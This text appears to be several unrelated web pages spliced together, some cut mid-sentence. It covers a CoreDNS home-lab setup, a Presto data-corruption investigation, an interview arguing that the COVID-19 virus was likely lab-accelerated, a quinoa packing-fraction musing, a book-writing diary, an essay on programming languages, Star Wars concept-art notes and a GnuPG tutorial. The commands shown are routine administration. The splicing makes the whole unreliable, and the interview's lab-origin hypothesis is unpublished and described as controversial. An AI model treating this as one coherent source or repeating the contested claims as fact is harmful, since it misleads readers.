</code></pre> <p>CoreDNS with the host plugin uses two configuration files: "Corefile" and "hosts" file.</p> <p>The "Corefile" configures Coredns to forward requests not destined for <code>ldelossa.net</code> to Google's DNS and cache the results for a bit. Any requests for <code>ldelossa.net</code> are forwarded to the "hosts" plugin, using the file <code>/etc/coredns/hosts</code>.</p> <p>The "hosts" defines hostname mappings. For each entry in this file Coredns will return an A record mapping the hostname to the IP address.</p> <pre><code><span>$</span><span> podman create --network ct-host --name coredns -dt -p 192.168.185.10:53:53/tcp -p 192.168.185.10:53:53/udp -v /etc/containers/etc.d/coredns:/etc/coredns coredns/coredns -conf /etc/coredns/Corefile</span>
</code></pre> <p>Above shows the podman command used to create the container.</p> <p>A few things to note</p> <ul> <li>Port 53(udp/tcp) is exposed to other devices on LAN via port-forwarding</li> <li>Configuration files are mapped from <code>/etc/containers/etc.d/coredns</code> to <code>/etc/coredns</code> inside the container.</li> <li>Editing the "hosts" file on "ct-host" will reload Coredns without having to restart the container.</li> </ul> <pre><code><span>$</span><span> podman generate systemd --name coredns &gt; /etc/systemd/system/coredns-container.service</span>
<span>$</span><span> systemctl daemon-reload</span>
<span>$</span><span> systemctl <span>enable</span> coredns-container</span>
<span>$</span><span> systemctl start coredns-container</span>
</code></pre> <p>A SystemD service can be generated and enabled with the commands above.</p> <h3>Configuring Devices</h3> <p>A typical approach to configuring devices to utilize a custom DNS server would be DHCP. Unfortunately my router does not allow the configuration of DHCP (poo-poo to you ampliFi). However, devices can "opt-in" by setting their DNS server to <code>192.168.185.10:53</code>.</p> <p>As new services come onto the network simply editing <code>/etc/containers/etc.d/coredns/hosts</code> on "ct-host" will provide immediate resolution for devices configured with this DNS.</p> <h2>Conclusion</h2> <p>Home labs are a great way to learn new technologies. By utilizing Podman and CoreDNS a solution for name resolution was devised. Mapping configuration files from the host into containers provides a fast and dynamic way to update DNS in the lab.</p> <p>In <a href="https://www.ldelossa.is/blog/home-network-pt2">Part 2</a> a mechanism for routing hostnames to specific containerized services is introduced.</p> </article></div></div></div>]]>

  <div itemprop="articleBody">
    <p>It all started on an Thursday afternoon in March, when <a href="https://github.com/sopel39">Karol Sobczak</a>
was grilling Presto with heavy rounds of benchmarks, as we were ramping up to Starburst Enterprise
Presto 332-e release. Karol discovered what seemed to be a serious regression, and turned out to be even more
serious Cloud environment issue.</p>

<!--more-->



<p>At the Presto project, we take serious care of stability and efficiency, so releases undergo
rigorous performance benchmarks. The intention is to safe guard against any performance regressions
or stability problems. Usually, the performance improvements are benchmarked separately when they
are being added to the codebase. At Starburst, those benchmarks are even more important, especially
for the Starburst Enterprise Presto LTS releases.</p>

<p>On a side note, we use <a href="https://github.com/prestosql/benchto/">Benchto</a> for organizing
<a href="https://github.com/prestosql/presto/tree/master/presto-benchto-benchmarks">Presto benchmark suites</a>,
executing them and collecting the results. We use managed <a href="https://kubernetes.io/">Kubernetes</a> in a public
cloud for provisioning Presto clusters, along with <a href="https://www.starburstdata.com/presto-on-kubernetes/">Starburst Enterprise Presto Kubernetes</a>.
We use <a href="https://jupyter.org/">Jupyter</a> for producing result reports in HTML and PDF formats.</p>



<p>It all started in March, when <a href="https://github.com/sopel39">Karol Sobczak</a>
was grilling Presto with heavy rounds of benchmarks for the Starburst Enterprise Presto 332-e release.
On one Thursday afternoon he reported stability problems, with few benchmark runs failing with
exceptions similar to:</p>

<div><div><pre><code>Query failed (#20200326_150852_00338_dj225): Unknown block encoding:
LONG_ARRAY� � �� � @@@���� �@  @ � �@@@ @@� @�@D�� @@��@ `� @@� @#�@ � 0�
... (9550 more bytes)
</code></pre></div></div>

<p>In Presto, a block encoding is a way of encoding a particular Block type (here, a <code>LongArrayBlock</code>).
They are used when exchanging blocks of data between Presto nodes, or in spill to disk.
Blocks form a polymorphic class hierarchy, so every time a block is encoded, we need
to also store the encoding identifier. The encoding identifier (here, the <code>LONG_ARRAY</code> string)
is written as <code>&lt;string length&gt;</code> (4-byte, signed integer in little-endian) followed by
<code>&lt;string bytes&gt;</code> containing the UTF-8 representation of the encoding id. Clearly, in the case above,
the receiver read the <code>&lt;encoding id length&gt;</code> as 9623 instead of 10! How could that be ever possible?</p>

<p>Presto 332 brought a lot of good changes and upgrade to Java 11 was one of them.
Therefore, Starburst Enterprise Presto 332-e was the first Starburst release using Java 11 by default.
For earlier releases, we ran benchmarks using AWS EC2 machines orchestrated with <a href="https://www.starburstdata.com/presto-aws-cloud/">Starburst’s Presto
CloudFormation Template (CFT)</a>. This was also the first time we did
Presto release benchmarks running on Kubernetes clusters, with AWS EKS. We could suspect many different factors
as being the cause. We started to sift through the code, search team’s “collective brain” and
the Internet for any ideas. One of the important sources was Vijay Pandurangan’s writeup on <a href="https://tech.vijayp.ca/linux-kernel-bug-delivers-corrupt-tcp-ip-data-to-mesos-kubernetes-docker-containers-4986f88f7a19">data
corruption bug discovered by Twitter in 2015</a>. Of course, we also repeated benchmark runs. Seeing is believing.</p>



<p>On the next day, a customer reported similar problems with their Presto cluster. Of course, they
were not running a yet-to-be-released version that we were still benchmarking. They run into what seemed to
be a very serious regression in a Starburst Enterprise Presto 323-e release line. The customer was also using
the AWS cloud, but not the Kubernetes deployment. They were using <a href="https://www.starburstdata.com/presto-aws-cloud/">CFT-based deployment</a>
– the same stack we were using for all our release benchmarks so far – and we had never run into issues like this before.
As the customer was using a fresh-off-press latest minor release, we decided (in spirit of global health care trend)
to “quarantine” that release and roll back the customer installation to the previous version.</p>

<p>However, the fact that a small bug fix release triggered data problems was unnerving. The fact that we
did not discover any of these problems before, was even more unnerving.</p>



<p>As we were running more and more, and even more test runs, we discovered new failure modes.
For example:</p>
<div><div><pre><code>Query failed (#20200327_001931_00020_8di4r): Cannot cast DECIMAL(7, 2) '18734974449861284.67' to DECIMAL(12, 2)
</code></pre></div></div>
<p>Well, this message is not <em>wrong</em>. It’s not possible to cast <code>18734974449861284.67</code> to <code>DECIMAL(12, 2)</code>.
Except that it is <em>also</em> not possible to have a <code>DECIMAL(7, 2)</code> with such value. Something wrong happened to the
data. At that moment, we realized the problem was very serious, because data could become corrupted.
This corrupted data could lead to a failure (like above), but it could also lead to incorrect query results,
or incorrect data being persisted (in case of <code>INSERT</code> or <code>CREATE TABLE AS</code> queries). We created
a virtual War Room (that is, a Slack channel), got together all Presto experts and our experienced field team
to discuss potential causes, further diagnostics and mitigation strategies.</p>

<p>Since the problem was affecting data exchanges between Presto nodes, we listed the following strategies
to try to dissect the problem:</p>

<ul>
  <li>determining which query (queries) is (are) causing failures,</li>
  <li>running with HTTP/2,</li>
  <li>reverting to running on Java 8,</li>
  <li>enabling exchange compression (as decompression is very sensitive to data corruption),</li>
  <li>trying to upgrade Jetty,</li>
  <li>determining whether failures correlate with JVM GC activity,</li>
  <li>inspecting the source code.</li>
</ul>



<p>We were able to quickly prototype and verify some of the ideas. Switching to HTTP/2 or
upgrading Jetty to the latest version did not help. Nor did downgrading to Jetty version
that had been using for a long time. We also verified that problem was reproducible with Java 8,
so we concluded Java 11 was not the cause of it.</p>



<p>We identified the problem occurs somewhere within exchanges, between one Presto worker
node serializing a <code>Page</code> object (basic unit of data processing in Presto) and another node
deserializing it.</p>

<p>While decimal cast failure didn’t directly point at the data corruption problem (there could
be many other reasons for it), there was no other explanation for the <code>Unknown block encoding</code> exceptions.
The serialization is done in <code>PagesSerde.serialize</code> (used by <code>TaskOutputOperator</code>, the data sender) and
deserialization is done in <code>PagesSerde.deserialize</code> (used by <code>ExchangeOperator</code>, the
receiver of the data). As the logic is nicely encapsulated in <code>PagesSerde</code> class, we
added checksums to the serialized data: <code>&lt;checksum&gt; &lt;serialized page&gt;</code>.
This felt like a smart move – except that it gave us nothing more than a confirmation that
there is a problem (“checksum failure”).
This we already knew.</p>

<p>We considered adding logging to capture data going out from one node and going in on
another node, but that would be huge amount of logs. One run of benchmarks transfers
hundreds of terabytes of data between the nodes.</p>

<p>We went ahead and created a Presto build that added data redundancy to be able to reconstruct
the data on the receiving side.
There are many <a href="https://en.wikipedia.org/wiki/Erasure_code">well-known error-correction codes</a>
(e.g. <a href="https://en.wikipedia.org/wiki/Reed%E2%80%93Solomon_error_correction">Reed–Solomon error correction</a>
available in Hadoop 3). In our case, speed of <em>implementation</em> (a.k.a. simplicity) was a deciding factor,
so we added data mirroring: <code>&lt;checksum&gt; &lt;serialized page&gt; &lt;serialized page&gt;</code>.
In order to avoid logging of all the data exchanges, we added the deserialized pages (both copies)
to the exceptions being raised.</p>

<p>The exception told us the first part was changed, since read checksum did not match the calculated
checksum (it was calculated based on the first copy of the data and was different than the checksum
calculated on the sending side).
Having the encoded data in the exception like that, it was easy to extract the actual data and compare,
so now we could see <em>how</em> the data was changed.</p>

            <h2>NYHET</h2>



        

        

            <h3 itemprop="description">
            The well-known Norwegian virologist Birger Sørensen and his colleagues have examined the corona virus. They believe it has certain properties which would not evolve naturally. These conclusions are politically controversial, but in this interview he shares the findings behind the headlines.
            </h3>

    

</div>


                <div><p>“I understand that this is controversial, but the public has a legitimate need to know, and it is important that it is possible to freely discuss alternate hypotheses on how the virus originated” Birger Sørensen starts to explain when Minerva visits him in his office one morning in Oslo.</p><p>Despite the explosiveness of his statements and research, Sørensen remains calm and collected.</p><p>Sørensen has been a point of controversy ever since former MI6 director Richard Dearlove cited a yet to be published article by Sørensen and his colleagues in an interview with The Daily Telegraph. The article claims that the virus that causes Covid-19 most likely has not emerged naturally.</p><p>“It’s a shame that there has already been so much talk about this, because I have yet to publish the article where I put forward my analysis”, Sørensen says in the form of an exasperated sigh.</p><p>Together with his colleagues, Angus Dalgleish and Andres Susrud have authored an article that looks into the most plausible explanations regarding the origins of the novel coronavirus. The article builds upon an already published article in the Quarterly Review of Biophysics that describes newly discovered properties in the virus spike protein. The authors are still in dialogue with scientific journals regarding an upcoming publication of the article.</p><p>News outlets are thus confronted with a difficult question: Are the findings and arguments Sørensen and his colleagues put forward of a sufficiently high quality to be presented and discussed in the public sphere? Sørensen explains that they in their dialogue with scientific journals are encountering a certain reluctance to publishing the article – without, however, proper scientific objections. Minerva has read a draft of the article, and has after an overall assessment decided that the findings and arguments do deserve public debate, and that this discussion cannot depend entirely on the publication process of scientific journals.</p><p>In this interview with Minerva, Sørensen therefore puts forward his hypothesis on why it is highly unlikely that the coronavirus emerged naturally.</p><p>On May 18th, WHO decided to conduct an inquiry into the coronavirus epidemic in China. Sørensen believes that it is important that this inquiry looks into new and alternate explanations for how the virus originated, beyond the already well-known suggestion that the virus originated in the Wuhan Seafood Market.</p><p>“There are very few who still believe that the epidemic started there, so as of today we have no good answers on how the epidemic started. Then we must also dare to look at more controversial, alternative explanations for the origin,” Sørensen says.</p><p>Birger Sørensen and one of his co-authors, Angus Dalgleish, are already known as HIV researchers par excellence.</p><p>In 2008, Sørensen’s work came to international <a href="https://www.dagensperspektiv.no/2008/norsk-firma-med-hiv-gjennombrudd">attention</a> when he launched a new immunotherapy for HIV. <a href="https://www.nature.com/search?author=%22Angus%20G.+Dalgleish%22">Angus Dalgleish</a> is the professor at St. George’s Medical School in London who became world famous in 1984 after having <a href="https://www.nature.com/articles/312763a0">discovered</a> a novel receptor that the HIV virus uses to enter human cells.</p><p>The purpose of the work Sørensen and his colleagues have done on the novel coronavirus, has been to produce a vaccine. And they have taken their experience in trialling HIV vaccines with them to analyse the coronavirus more thoroughly, in order to make a vaccine that can protect against Covid-19 without major side effects.</p><h2>Exceptionally well adjusted</h2><p>“The difference between our approach and other vaccine manufacturers is that we have a chemistry background, and we analyse the virus in detail as if we were making a drug,” Sørensen starts to explain.</p><p>“Biology is also chemistry, so by considering the virus from a chemistry perspective, we carry out more detailed analysis, zooming in on certain components.”</p><p>Sørensen takes us through the basic elements of their approach:</p><p>“The first thing you need to establish is which parts of the virus are changing, and which parts are stable. If you want to make a vaccine that lasts, you must stimulate the immune system to react against those parts of the virus that are constant, otherwise the effect will disappear and, in the worst-case scenario, lead to increased illness.</p><p>“Once we know this, we can try to make a vaccine. Where we differ is that we are trying to make a vaccine that uses elements that have as little in common with the body’s natural components as possible, so that the immune system is taught to recognise exactly what the vaccine should protect against”, Sørensen elaborates.</p><p>Sørensen believes this is an important insight which will prevent the immune system from being falsely stimulated in a way that could lead the vaccine to create too many dangerous side effects in the vaccinated person.</p><p>“When we have not succeeded in creating an HIV vaccine, despite the enormous efforts put into that endeavour for the past 30 years, it is because we haven’t understood this,” Sørensen continues.</p><p>He believes that there has not been enough interaction between the part of the pharmaceutical industry that makes HIV medicines and the part that runs the vaccine research. As a consequence, the knowledge you need to make a successful vaccine against HIV in the big pharmaceutical companies has not been adequately exploited by the big, international HIV preventing vaccine studies that have been carried out.”</p><p>Asked about what significance his approached has had when he has analyzed the coronavirus, Sørensen explains:</p><p>“We have examined which components of the virus are especially well suited to attach themselves to cells in humans. And we have done this by comparing the properties of the virus with human genetics. What we found was that this virus was exceptionally well adjusted to infect humans.”</p><p>He pauses for a second.</p><p>“So well that it was suspicious,” he adds.</p><h2>Perfected to infect humans</h2><p>It is already known that the novel coronavirus, like the virus that caused the SARS epidemic in Southeast Asia in 2002-2003, could attach itself to the ACE-2 receptors in the lower respiratory tract.</p><p>“But what we have discovered is that there are properties in this new virus which enables it to use an additional receptor, and create a binding to human cells in the upper respiratory tract and the intestines which is strong enough to produce an infection,” Sørensen elaborates.</p><p>Sørensen says that it is the use of this additional receptor that most likely results in a different illness in Covid-19 patients than the one resulting from SARS.</p><p>“This is what enables the virus to transmit to a greater degree between humans, without the virus having attached itself to the ACE-2 receptors in the lower respiratory tract, where it causes deep pneumonia.</p><p>“That is also why so many of the Covid-19 patients have mild symptoms at the start of the illness, and are contagious before they develop severe symptoms,” he adds.</p><p>It might also explain why some people are ‘super spreaders’ without being ill themselves, Sørensen says.</p><p>In the already published article Sørensen and his colleagues Angus Dalgleish and Andres Susrud describe what they claim is curious about the spike protein of the coronavirus, which makes it especially well suited to infect humans. These findings are the foundation for the hypothesis Sørensen and his colleagues develop in the new article, where they claim that the virus is not natural in origin.</p><div id="factbox-361864">
    <div>
        
        <h2>FACT BOX – Spike Protein</h2>
        <p>A spike protein is a part of the virus attached to the surface of the virus. The spike protein is used by the virus when it enters cells, enabling it to stick in humans. The properties of the spike determines which receptors a virus can utilise and thus which cells the virus can enter to create illness.</p>
        
    </div>
    
</div><p>“There are several factors that point towards this,” says Sørensen. “Firstly, this part of the virus is very stable; it mutates very little. That points to this virus as a fully developed, almost perfected virus for infecting humans.</p><p>“Secondly, this indicates that the structure of the virus cannot have evolved naturally. When we compare the novel coronavirus with the one that caused SARS, we see that there are altogether six inserts in this virus that stand out compared to other known SARS viruses,” he goes on explaining.</p><p>Sørensen says that several of these changes in the virus are unique, and that they do not exist in other known SARS coronaviruses.</p><p>“Four of these six changes have the property that they are suited to infect humans. This kind of aggregation of a type of property can be done simply in a laboratory, and helps to substantiate such an origin,” Sørensen points out.</p><h2>An artificially created virus</h2><p>Asked about whether this implies that the virus is not natural, Sørensen goes on to explain the laboratory process that leads to the creation of new viruses.</p><p>“In a sense it is natural. But the natural processes have most likely been accelerated in a laboratory,” he explains. “It’s also possible for a virus to attain these properties in nature, but it’s not likely. If the mutations had happened in nature, we would have most likely seen that the virus had attracted other properties through mutations, not just properties that help the virus to attach itself to human cells.”</p><p>Sørensen vividly explains this argument:</p><p>“Imagine that you have cultivated a billion coronaviruses you have gathered from nature, then you take this mass of viruses and inject them into a human cell culture from for example the upper respiratory tract. As a result, a few of these viruses will change in order to better attach themselves to …</p></div></section></article></div>

         <img src="https://www.efavdb.com/images/quinoa.jpg">
</p>

<p>I was struck the other day by the following:  The cooking instructions on my
Bob’s tri-colored quinoa package said to combine 2 cups of water with 1 cup of
dried quinoa, which would ultimately create 4 cups of cooked quinoa.  See image&nbsp;above.</p>
<p>My first reaction was to believe that some error had been made.  However, I
then realized that the explanation was packing:  When one packs spheres or
other awkward solid geometric shapes into a container, they cannot fill the
space completely.  Little pockets of air sit between the spheres.  A quick
google search for the packing fraction of spheres gives a value of <span>\(0.75\)</span> for a
crystalline structure and about <span>\(0.64\)</span> for random packings — apparently a
universal&nbsp;law.</p>
<p>We can get a similar number out from my quinoa instructions: Suppose that
before the quinoa is cooked, the water fills its volume completely.  However,
after cooking, the water is absorbed into the quinoa and forced to share its
packing fraction.  The quinoa stays at the same packing fraction before and
after cooking, so the water must be responsible for the volume growth.  This
implies it went from 2 cups to 3,&nbsp;or
</p>
<p>\begin{eqnarray} \tag{1} \label{1}
2 = \rho \times 3,
\end{eqnarray}</p>
<p>
where <span>\(\rho\)</span> is the packing fraction of the quinoa “spheres”. We conclude that
the packing fraction is <span>\(\rho = 2/3\)</span>, very close to the googled value of <span>\(\rho
= 0.64\)</span>.</p>

It’s twenty years of work experience, numerous failures, a handful of successes and a personal desire to continously grow and expand my knowledge.</p> <p>For the past few years, I repeatedly thought I would like to write a book about everything it takes to run a web application in production. There are tutorials, video courses and guides available online for any topic you can imagine. Need to compare React and Svelte? You’ll find <a href="https://www.mikenikles.com/blog/why-i-moved-from-react-to-svelte-and-why-others-will-follow">plenty of tutorials</a>. Want to learn SRE (site reliability engineering) best practices? <a href="https://landing.google.com/sre/books/" rel="nofollow">Check here</a>.</p> <p>However, unless you know what to look for, you won’t succeed because there are so many pieces to the puzzle, it’s challenging to know where to start.</p> <h3>February 2020</h3> <p>With COVID-19 spreading across the globe and governments putting countries into lockdown, it became immediately apparent that this is not like a previous pandemic. I had two options:</p> <ul><li>worry, feel anxious, be unsure what to do</li> <li>look at it as an opportunity</li></ul> <p>I was privileged enough not to worry, not to feel anxious. So I went for the second option and decided to make the best of the situation.</p> <p>It was now or never to write a book. Luckily, my wife supported me all the way, otherwise this would have never been possible. In fact, she encouraged me to spend as much of my spare time on the book because she knew how much it would mean to me to publish that book I had been talking about for years.</p> <p>The outline of the book had been in my mind for a while already. The tech stack I wanted to use was pretty clear to me as well. I wanted to use technologies that I believe in, technologies I use in my projects and technologies I believe are about to become very popular.</p> <p><strong>Self-publish vs. using a publisher</strong></p> <p>This is a tricky one. Late in 2019, I was contacted by two publishers who asked me to develop a <a href="https://svelte.dev/" rel="nofollow">Svelte</a> online course. When I learned that my take-home pay would be between 12% and 18%, I declined. Now, writing a book was never about earning a lot or quitting my day job. It was about sharing my knowledge and helping others learn from my experience. Having said that and knowing my personality, I knew I would make this as perfect as it gets and invest a lot of time. So why did I reject the publishers? Quite simple, while the financial reward is not the first priority, I believe my knowledge and two decades of experience is worth something worth paying for. It’s still a lot cheaper than four years at university where you are taught things you likely won’t need in real life.</p> <p>In addition, a publisher provides you with technical reviews. Without sounding arrogant, my book is about my experience, my view of what’s best and my best practices. There are very few people who know my experience better than myself. It turned out I had amazing technical reviwers among my co-workers and friends, and even a PhD student from Austria who, by chance, found my website and contacted me. He became the first to fully review line by line and provided input as valuable as a tech reviewer at a publishing company could have done.</p> <p>A publisher would have given me a wider reach, but on the other hand, my blog gets 80 to 100 unique visitors per day from across the world, that’s good enough for me to get started.</p> <h3>March, April and May 2020</h3> <p>From a “behind the scenes” point of view, these months were not exciting. Lots of writing, both the book and the corresponding source code.</p> <p>I started with an empty Google Doc, wrote down the top-level chapters and started with the “About the author” chapter. It was the only chapter I was pretty sure I knew what to write :-). It also helped to turn the white screen into something that looked like a tiny essay. Anything other than a blank page is better at that stage of the process!</p> <p><strong>Development of the source code</strong></p> <p>The idea was to give access to the source code to all readers. I wanted to make sure the commit history, the PRs and everything related to the code was perfect. So how did I manage 105 commits without any mistakes or commit messages such as “Whoops… try again.”?</p> <p>I had two repositories! A “playground” where I experimented, made sure everything worked and tested things for individual chapters. In parallel to the experimentation, I wrote the book’s hands-on part. When I was satisfied with the code, I switched to the “clean” repository, the one readers have access to now. I followed the instructions I wrote in the book. This made sure I was the first person to actually follow along my instructions in the book. It also meant I wrote the entire book’s source code twice - once with lots of experimentation and once in a clean way. As I’m writing this, I was curious to see how many commits the “playground” repo has and to my surprise… it has 119! That’s only 14 more than the final repo… I could have sworn it would be a lot messier!</p> <p><strong>June 2020</strong></p> <p>The book’s content was completely written some time in early June. At that point, I shared the book with a few more technical reviewers. Prior to that, I had a few close friends and “Thomas, the Austrian” who provided feedback. The tech reviews went very well and I felt comfortable publishing the book.</p> <p><strong>June 26, 2020</strong></p> <p>Two days before the self-imposed publication deadline, my wife suggested we develop a landing page for the book. “Sure!” She also did some research on book covers and designed the one you see now. Based on that, we developed the website in the same colors.</p> <p><strong>June 27, 2020</strong></p> <p>I adjusted headings, aligned them to new pages and updated the table of contents. My wife reviewed it and made sure everything was properly aligned. My wife got up, looked at me and said, “We need to change the icons in the book.” One day to go… I was surely nervous, but learned over the years that it’s best to trust her. I’m glad I did as the icons now look a million times better than the black &amp; white ones I used previously!</p> <p>June 27 was a Saturday and we stayed up until 2:30am or so on Sunday morning. When we finally went to bed, we felt we were ready.</p> <p><strong>June 28, 2020</strong></p> <p>A few last-minute updates to the table of contents due to changes to page numbers and I downloaded the PDF and published it on <a href="https://gum.co/cloud-native-web-development" rel="nofollow">Gumroad</a>.</p> <h2>Lessons I learned up to this point</h2> <p><strong>Pros</strong></p> <p>I think the best thing I did was starting with a very clear idea in my mind of what I want to write about. I knew exactly who the target audience would be, I pretty much had all chapters in mind and also knew I wanted there to be source code and a private community of everyone who buys the book.</p> <p>Patience &amp; dedication: From the very beginning, I set myself a strict deadline of June 28, 2020 (my birthday). This project was a big time investment and I knew there is no excuse to delay anything if I wanted to hit that deadline. The rule I set myself was very clear: Spend as much of my spare time on writing, every day. Looking back at my time tracking, I wrote at least a little bit every single day.</p> <p><strong>Cons</strong></p> <p>Writing a 200+ book, with 19 pull requests is a lot of work and I spent a few hundred hours on it. If I write another book, I will give myself more time. It is more likely though that I would write a shorter book ;-).</p> <p>Perfectionism is your biggest enemy to get stuff done. Sure, I’m very proud of the final outcome and how each chapter maps to a pull request and sometimes even individual sub-chapters that map to commit messages. My readers absolutely love and appreciate this, but it put a lot of pressure on me throughout the process.</p> <h2>The first week since publication</h2> <p><picture><source srcset="https://www.mikenikles.com/blog-posts/2020-07-03-how-i-wrote-214-pages-for-a-web-development-book-with-19-pull-requests-in-3-months/1.webp" type="image/webp"><source srcset="https://www.mikenikles.com/blog-posts/2020-07-03-how-i-wrote-214-pages-for-a-web-development-book-with-19-pull-requests-in-3-months/1.jp2" type="image/jp2"><img alt="Gumroad sales in week 1" src="https://www.mikenikles.com/blog-posts/2020-07-03-how-i-wrote-214-pages-for-a-web-development-book-with-19-pull-requests-in-3-months/1.jpg"></picture></p> <p>37 books sold with no advertising other than posting on my Twitter account (500 followers) and LinkedIn. Given the incredible feedback I received from reviewers, I am confident I will reach a wider audience once the 37 readers wrap up the book and hopefully provide some feedback on Twitter to help promote the book.</p> <p>Estimates from reviewers vary between 30 to 50 hours to finish the book, depending on their level of experience in web development. I’m keen to keep an eye on what happens over the next few weeks and months.</p> <h2>Final thoughts</h2> <p>Writing Cloud Native Web Development was an incredibly fun project. I learned a lot about writing, publishing, EPUB (it’s basically HTML!), marketing, and what it means to be dilligent and stick to a strict schedule.</p> <p>Would I do it again? Possibly, but not in 2020 :-).</p> <p>Please head over to the <a href="https://www.mikenikles.com/cloud-native-web-development">book’s page</a> and get yourself a copy!</p> <p>👋</p></div></div>]]>

              <h2><a name="h.vq1i2tq8whe6"></a><span>A whole lot
                  of languages going on</span></h2>
              <p><span>From that late 1970’s through the early
                  1990’s I had the need to program in a lot of different
                  languages. At first I had no language tools, and programmed my
                  6502 Atari with opcodes. Then there were the “standard”
                  languages: Basic, Pascal, Fortran, Assembly (8086, 6502,
                  PDP-11, 360, 68000, TMS320), SQL, C, C++. There were the batch
                  languages: Batch, Bourne, Bash, Korn, C-Shell, Rexx. Then
                  there were application-specific command languages that seemed
                  to go along with every new program that was released.
                  &nbsp;That was far too many languages for me. Being of limited
                  intellect, I felt that each time I had to master a new
                  language I would have to give up mastery of some old language.</span></p>

                          languages is still a problem today, in my opinion, and
                          it’s a theme to which I’ll return.</span></p>
                      
                      <p><span>Take, for a recent example, the
                          current widespread use of templating languages in the
                          web space. There are several server-side templating
                          languages people apply to their HTML code, and then
                          there are several server-side templating languages. So
                          already there are two problems: 1) several templating
                          languages to choose from (crazy), and 2) the HTML
                          templating languages are different than the CSS
                          templating languages (super-crazy). The issue is even
                          worse because most web developers don’t yet realize
                          that they can optimize their systems by delivering
                          slightly different javascript code to their
                          slightly-different clients, but when they realize it,
                          guess what, they’ll probably create yet another
                          server-side templating language just for JS files, and
                          naturally it will resemble neither the HTML nor the
                          CSS templating languages (crazy crazy crazy).</span></p>
                      
                      <p><span>To make matters worse, every
                          developer that wants to prove himself will at some
                          point develop a new language. Is it just as capable of
                          implementing a turing engine as all the other
                          languages that already exist? Yes. Is it better than
                          the existing language it’s meant to replace? Maybe. Is
                          it so much better that the rest of us should throw out
                          our expertise to learn the new language? Almost
                          certainly not.</span></p>

              <h2><a name="h.k1btxapqspg"></a><span>C is great,
                  but not for everybody</span></h2>
              <p><span>My favorite language was C, due to it’s small
                  syntax (very few keywords), generality, and high performance.
                  C was powerful and fun. If you wanted to get serious work
                  done, you used C. (Curiously, even most of those
                  command-specific and batch languages I mentioned above were
                  themselves implemented in C.)</span></p>
              
              <p><span>Most importantly, C was where the good and
                  high-paying jobs were, which is why people wanted to learn C
                  and why they showed up for an adult-education class that I was
                  teaching. The C language had a reputation for being difficult,
                  and so I expected it to be difficult to teach. But as we
                  stepped through the basic syntax elements it wasn’t hard at
                  all, almost everyone was following right along very quickly.
                  Until...</span></p>
              
              <p><span>At one point the majority of the class, who
                  until then was learning to program surprisingly quickly,
                  stopped clicking with what I was teaching. Certain topics just
                  left them completely confused: e.g., pointers (incrementing
                  and dereferencing), sizes of datum and data, allocation and
                  freeing, stack use... It took a while, but eventually I
                  realized where the problem lay: For a large segment of the
                  students, maybe most, any aspect of C that involved
                  understanding how data was arranged in computer memory just
                  led to total confusion. Maybe I was teaching it wrong? Maybe a
                  fundamental a background in opcodes and assembly and even
                  circuit boards is needed to really “get it”? Maybe it’s just
                  an unnatural concept that doesn’t mesh with most humans
                  brains? In any case, I started to think that most of these
                  students were never going to be top-notch C programmers, at
                  least not with me as the teacher.</span></p>

                          short-lived processes. And maybe for most trivial

An ironic decision as we'll see later, when outside influence forced him to change his mind back.</p><p>He also wrote “see book cover”, although we have no idea which book is referring to. He clearly had something very specific in mind since the note is right next to that drawing (and so the sci-fi book cover trawling begins anew). This along with the <em>Stainless Steel Rat</em> reference reaffirms Lucas's approach to developing ideas and visual starting points, by trawling every science fiction book and magazine he could get his hands on.</p><p>We'll remember this bit later on, but for now, let's get introduced to our cast.</p><p>About a year and a half into his space fantasy screenplay, George Lucas hired one of the first creatives to help flesh out the world of <em>Adventures of the Luke Starkiller</em>. The studios didn't get what Lucas was selling, and his best bid was to jump start their imaginations with some visuals.</p></div></div><div data-block-type="5" id="block-yui_3_17_2_3_1456074203728_22957"><div>

<p>Some tools are built into the operating system, while others must be installed. </p>
<p>Thus, lets see up next how to encrypt and decrypt files with a password in Linux.</p>
<h2 id="Encrypt-files-with-a-GUI"><a href="#Encrypt-files-with-a-GUI" title="Encrypt files with a GUI"></a>Encrypt files with a GUI</h2><p>Another useful tip on how to encrypt files with a password in Linux is to use a graphical tool that features a Nautilus file manager. </p>
<p>You can encrypt/decrypt files with a right-click on the target file.<br>Type the command  <code>sudo apt-get install seahorse-nautilus -y</code>, and after the installation process is done, restart Nautilus with the command nautilus -q. </p>
<p>From this point on, all you have to do is right click on the file you want encrypted and click the encrypt function.</p>
<p><img src="https://bsdnerds.org/images/nautilus-encrypt-gui.png" alt="encrypt files with gui using nautilus on linux"></p><h2 id="Encrypt-files-with-gnupg"><a href="#Encrypt-files-with-gnupg" title="Encrypt files with gnupg"></a>Encrypt files with gnupg</h2><p>GnuPG represents a tool useful for securing both communication and data storage. It is great for encrypting files/folders and for designing digital signatures. This tool comes with a professional key management option.</p>
<h3 id="Install-gnupg"><a href="#Install-gnupg" title="Install gnupg"></a>Install gnupg</h3><p>GnuPG can be installed in <strong>Debian, Ubuntu or Mint Linux</strong> with the following command: </p>
<pre><code>$ sudo apt-get install gnupg</code></pre><p>For <strong>Red hat</strong> or <strong>CentOS Linux</strong> you will have to use the command - </p>
<pre><code>$ sudo yum install gnupg</code></pre><p>For <strong>Fedora Linux</strong> you will have to use the command -<br>    $ sudo dnf install gnupg</p>
<p>For <strong>Arch Linux</strong> you will have to use the command - </p>
<pre><code>$ sudo pacman -S gnupg</code></pre><p>For <strong>OpenSUSE Linux</strong> you will have to use the command - </p>
<pre><code>$ sudo zypper install gpg2</code></pre><p>For <strong>FreeBSD unix</strong> you will have to use the command for the port -</p>
<pre><code># cd /usr/ports/security/gnupg/ &amp;&amp; make install clean</code></pre><p>and add the package via </p>
<pre><code># pkg install gnupg.</code></pre><p>For <strong>OpenBSD unix</strong> you will have to use the command -</p>
<pre><code>$ doas pkg_add gnupg</code></pre><h3 id="How-to-use-GPG"><a href="#How-to-use-GPG" title="How to use GPG"></a>How to use GPG</h3><p>After this, you can start encrypting your data in either Linux or Unix, with the aid of the following commands:<br>    A single file requires the command -</p>
<pre><code>$ gpg -c filename</code></pre><p>    A myfinancial.info.txt file requires the command -</p>
<pre><code>$ gpg -c myfinancial.info.txt</code></pre><p>On the other hand, to decrypt data in Linux or Unix systems, you can use one of the following commands:</p>
<pre><code>$ gpg myfinancial.info.txt.gpg
$ gpg -d myfinancial.info.txt.gpg
$ gpg --decrypt myfinancial.info.txt.gpg</code></pre><h2 id="Hide-files-with-File-Manager"><a href="#Hide-files-with-File-Manager" title="Hide files with File Manager"></a>Hide files with File Manager</h2><p>Even though this is not actually an encryption process, it is quite helpful for hiding important data in plain sight. </p>
